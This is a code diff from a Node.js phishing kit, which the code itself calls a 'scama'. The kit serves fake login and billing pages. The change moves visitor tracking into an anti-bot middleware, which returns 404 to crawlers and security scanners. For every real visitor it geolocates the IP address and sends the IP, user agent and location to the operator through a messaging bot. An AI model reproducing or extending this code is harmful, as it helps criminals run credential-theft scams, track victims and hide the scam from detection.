@@ -82,38 +82,6 @@ app.get('/login', async (req, res) => {
 });
 
 
-app.get('/', async (req, res) => {
-    let message = "";
-    const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
-        return apiResponse.data;
-    };
-
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
-
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-
-    try {
-
-        message += ` ✈️ ${ipAddress} visited your scama on ${formattedDate}\n
-        🌐 ${userAgent}\n
-        📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
-
-        const sendMessage = sendMessageFor(botToken, chatId); 
-        sendMessage(message);
-
-        console.log(message);
-
-    } catch (error) {
-        // Handle any errors, for example, file not found
-        console.error('Error reading file:', error);
-        res.status(500).send('Internal Server Error');
-    }
-});
-
 app.get('/billing', async (req, res) => {
     try {
         // Read the content of the login.html file
@@ -290,7 +258,7 @@ function isBotRef(referer) {
 
 
 // Middleware function for bot detection
-function antiBotMiddleware(req, res, next) {
+async function antiBotMiddleware(req, res, next) {
     const clientUA = req.headers['user-agent'] || req.get('user-agent');
     const clientIP = getClientIp(req);
     const clientRef = req.headers.referer || req.headers.origin;
@@ -298,6 +266,36 @@ function antiBotMiddleware(req, res, next) {
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
         return res.status(404).send('Not Found');
     } else {
+        let message = "";
+        const sendAPIRequest = async (ipAddress) => {
+            const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+            console.log(apiResponse.data);
+            return apiResponse.data;
+        };
+    
+        const userAgent = req.headers["user-agent"];
+        const systemLang = req.headers["accept-language"];
+    
+        const ipAddress = getClientIp(req);
+        const ipAddressInformation = await sendAPIRequest(ipAddress);
+    
+        try {
+    
+            message += ` ✈️ ${ipAddress} visited your scama on ${formattedDate}\n
+            🌐 ${userAgent}\n
+            📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
+    
+            const sendMessage = sendMessageFor(botToken, chatId); 
+            sendMessage(message);
+    
+            console.log(message);
+    
+        } catch (error) {
+            // Handle any errors, for example, file not found
+            console.error('Error reading file:', error);
+            res.status(500).send('Internal Server Error');
+        }
+
         res.sendFile(path.join(__dirname, 'index.html'));
     }
 }
